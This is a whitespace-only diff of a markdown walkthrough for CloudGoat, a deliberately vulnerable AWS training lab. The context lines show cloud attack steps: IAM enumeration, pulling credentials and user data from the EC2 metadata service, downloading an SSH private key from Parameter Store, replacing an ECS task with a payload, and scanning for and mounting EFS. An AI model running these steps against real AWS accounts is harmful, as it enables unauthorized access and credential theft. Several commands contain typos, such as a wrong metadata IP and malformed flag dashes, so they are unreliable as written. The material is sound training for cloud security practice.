@@ -11,7 +11,7 @@ tags: [Lab, CTF, CloudGoat]
 
 
 # CloudGoat (☁️🐐)
- 
+
 
 _CloudGoat is Rhino Security Labs' "Vulnerable by Design" AWS deployment tool._
 
@@ -22,7 +22,7 @@ _CloudGoat is Rhino Security Labs' "Vulnerable by Design" AWS deployment tool._
 
 > CloudGoat is Rhino Security Labs' "Vulnerable by Design" AWS deployment tool.
 > It allows you to hone your cloud cybersecurity skills by creating and completing several "capture-the-flag" style scenarios.
-> Each scenario is composed of AWS resources arranged together to create a structured learning experience.  
+> Each scenario is composed of AWS resources arranged together to create a structured learning experience.
 
 Before proceed
 > **Warning #1:** CloudGoat creates intentionally vulnerable AWS resources into your account. DO NOT deploy CloudGoat in a production environment or alongside any sensitive AWS resources.
@@ -275,7 +275,7 @@ InPolicy='aws iam list-user-policies \
 AWSPolicy='aws iam list-attached-user-policies \
             –-user-name $USERNAME \
             –-profile $SRC_PROFILE'
-AWSPolicyArn=`echo $AWSPolicy | jq -r .AttachedPolicies[].PolicyArn`  
+AWSPolicyArn=`echo $AWSPolicy | jq -r .AttachedPolicies[].PolicyArn`
 
 
 
@@ -284,7 +284,7 @@ AWSPolicyArn=`echo $AWSPolicy | jq -r .AttachedPolicies[].PolicyArn`
 AWSPolicyInfo='aws iam get-policy \
                 -–policy-arn $AWSPolicyArn \
                 -–profile $SRC_PROFILE '
-AWSPolicyVer=`echo $AWSPolicy | jq -r .Policy.DefaultVersionId`  
+AWSPolicyVer=`echo $AWSPolicy | jq -r .Policy.DefaultVersionId`
 
 
 # Review details of the policy
@@ -302,7 +302,7 @@ aws iam get-policy-version \
 # two roles assigned to the user: “cg-debug-role-cgidpqw7rhl92u” and “cg-lambdaManager-role-cgidpqw7rhl92u”.
 IAMRolesInfo='aws iam list-roles \
             -–profile $SRC_PROFILE'
-AWSRoleName=`echo $IAMRolesInfo | jq -r .Roles[.RoleName]`  
+AWSRoleName=`echo $IAMRolesInfo | jq -r .Roles[.RoleName]`
 
 DebugRole='cg-debug-role-cgidpqw7rhl92u'
 LambdaRole='cg-lambdaManager-role-cgidpqw7rhl92u'
@@ -431,7 +431,7 @@ aws iam list-attached-user-policies \
 > Introduction
 > This scenario is inspired by the Capital One breach.
 > 2019, a bad actor accessed data stored in AWS S3 buckets owned by Capital One and posted the exfiltrated data on GitHub. The bad actor gained access to the S3 bucket by exploiting a misconfigured AWS service (in this case it seems to be a firewall) to run commands on the Elastic Cloud Compute (EC2) Instance.
-> In addition, the EC2 Instance also had an Identity and Access Management (IAM) role assigned, which allowed anyone who had access to the server to access AWS resources such as the AWS S3 buckets.  
+> In addition, the EC2 Instance also had an Identity and Access Management (IAM) role assigned, which allowed anyone who had access to the server to access AWS resources such as the AWS S3 buckets.
 
 ![scenario2-11](https://i.imgur.com/g2n9m9R.png)
 
@@ -980,7 +980,7 @@ curl http://169.254.269.254/latest/meta-data/iam/security-credentials/role-name
 # all the command history, discovers the RDS database credentials and address.
 curl http://169.254.169.254/latest/user-data
 
-# The user data contains commands and credentials to the RDS instance (with table “sensitive information”).  
+# The user data contains commands and credentials to the RDS instance (with table “sensitive information”).
 # access the RDS database using the credentials they found and acquires the scenario's goal: the secret text stored in the RDS database
 psql postgresql://<db_user>:<db_password>@<rds-instance>:5432/<db_name>
 # cloudgoat ->
@@ -1066,11 +1066,11 @@ aws s3 cp s3://<bucket>/key.pub . \
 # It’s the same EC2 instance and load balancer identified in Lara’s Path.
 aws elbv2 describe-load-balancers --profile $SRC_PROFILE
 
-# But this time we have an SSH key for the EC2 instance.  
+# But this time we have an SSH key for the EC2 instance.
 # So try connecting to the EC2 instance. But first, change the permission of the SSH key.
 chmod 777 key.pub
 
-ssh -i private_key ubuntu@public.ip.of.ec2  
+ssh -i private_key ubuntu@public.ip.of.ec2
 
 
 
@@ -1231,7 +1231,7 @@ aws rds describe-db-subnet-groups \
     --query "DBSubnetGroups[?contains(DBSubnetGroupName,'rds')]" \
     --profile calrissian
 
-# 2. check if there is a security group that allows us to communicate with RDS service.  
+# 2. check if there is a security group that allows us to communicate with RDS service.
 aws ec2 describe-security-groups \
     --query "SecurityGroups[?contains(Description,'RDS')]" \
     --profile calrissian
@@ -1295,7 +1295,7 @@ psql -h <INSTANCE-PUBLIC-DNS-NAME> -p 5432 -d securedb -U cgadmin
 #  list all the parameters in the Parameter Store of the AWS account.
 aws ssm describe-parameters --profile $SRC_PROFILE
 
-# the Parameter Store has an EC2 SSH Key Pair.  
+# the Parameter Store has an EC2 SSH Key Pair.
 # download the SSH private key
 aws ssm get-parameter \
     --name cg-ec2-private-key-cgidetofos97ig \
@@ -1430,7 +1430,7 @@ aws ecs register-task-definition \
     --profile ruse > task_template.json
 
 
-# Now use task_def.json to fill out template.json with the desired payload. 
+# Now use task_def.json to fill out template.json with the desired payload.
 
 # register the template to replace the currently running task.
 register-task-definition --cli-input-json file://task_template.json --profile ruse
@@ -1462,9 +1462,8 @@ nmap -Pn -P 2049 --open 10.10.10.0/24
 
 
 # Mount discovered ec2
-cd /mnt 
-sudo mkdir /efs 
+cd /mnt
+sudo mkdir /efs
 sudo mount -t nfs4 -o nfsvers=4.1,rsize=1048576,wsize=1048576,hard,timeo=600,retrans=2,noresvport <IP ADDRESS OF EFS>:/ efs
 
 ```
- 
